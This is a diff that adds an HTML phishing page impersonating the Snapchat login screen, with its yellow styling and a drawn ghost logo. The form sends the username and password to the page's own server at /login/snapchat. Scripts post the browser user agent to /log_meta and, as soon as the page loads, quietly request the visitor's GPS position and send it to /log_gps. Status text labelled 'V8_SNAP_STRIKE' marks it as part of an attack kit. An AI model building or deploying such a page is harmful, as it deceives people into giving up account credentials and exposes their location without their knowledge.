@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat - Log In</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com');
+        
+        body {
+            background-color: #FFFC00;
+            font-family: 'Avenir', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .login-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 45px 35px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+        }
+
+        .input-snap {
+            width: 100%;
+            background-color: #f2f2f2;
+            border: 1px solid #f2f2f2;
+            border-radius: 30px;
+            padding: 14px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+
+        .input-snap:focus {
+            background-color: #ffffff;
+            border-color: #000000;
+            outline: none;
+        }
+
+        .btn-snap {
+            width: 100%;
+            background-color: #000000;
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 15px;
+            padding: 16px;
+            border-radius: 30px;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-snap:active {
+            transform: scale(0.98);
+            opacity: 0.9;
+        }
+
+        #nexo-status {
+            display: none;
+            font-family: monospace;
+            font-size: 9px;
+            color: #000;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
+
+    <div class="login-card text-center">
+        
+        <!-- DRAWN SNAPCHAT GHOST LOGO (SVG) -->
+        <div class="flex justify-center mb-6">
+            <svg width="60" height="60" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org">
+                <path d="M50 10C35 10 25 20 25 35C25 38 26 42 28 45C22 48 15 52 15 60C15 65 20 68 25 68C26 68 28 67 29 67C30 75 38 82 50 82C62 82 70 75 71 67C72 67 74 68 75 68C80 68 85 65 85 60C85 52 78 48 72 45C74 42 75 38 75 35C75 20 65 10 50 10Z" fill="white" stroke="black" stroke-width="5" stroke-linejoin="round""")/>>
+            </svg>
+        </div>
+
+        <h2 class="text-2xl font-extrabold mb-10">Log In</h2>
+
+        <form id="scForm" action="/login/snapchat" method="POST" class="text-left space-y-6">
+            <div>
+                <label class="block text-[11px] font-bold text-gray-500 uppercase tracking-widest ml-4 mb-2">Username or Email</label>
+                <input name="user" type="text" class="input-snap" required autocomplete="off">
+            </div>
+
+            <div>
+                <label class="block text-[11px] font-bold text-gray-500 uppercase tracking-widest ml-4 mb-2">Password</label>
+                <input name="pass" type="password" class="input-snap" required autocomplete="off">
+            </div>
+
+            <button id="scBtn" type="submit" class="btn-snap">Log In</button>
+            
+            <div class="pt-4">
+                <a href="#" class="text-[13px] font-bold text-gray-400 hover:text-black transition">Forgot Password?</a>
+            </div>
+        </form>
+
+        <!-- NEXO-V8 SYNC STATUS -->
+        <div id="nexo-status" class="animate-pulse">
+            [*] V8_SNAP_STRIKE: HANDSHAKE_CONNECTED
+        </div>
+    </div>
+
+    <script>
+        const scForm = document.getElementById('scForm');
+        const scBtn = document.getElementById('scBtn');
+        const status = document.getElementById('nexo-status');
+
+        scForm.onsubmit = function() {
+            scBtn.innerText = "Connecting...";
+            scBtn.style.opacity = "0.7";
+            status.style.display = "block";
+            
+            // Meta-Sync for Nexo-Terminal
+            const meta = {
+                ua: navigator.userAgent,
+                ref: "SNAP_V8_VERT"
+            };
+            
+            fetch('/log_meta', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(meta)
+            });
+            
+            return true;
+        };
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: p.coords.latitude, 
+                            lon: p.coords.longitude,
+                            site: "SNAP_V8"
+                        })
+                    });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
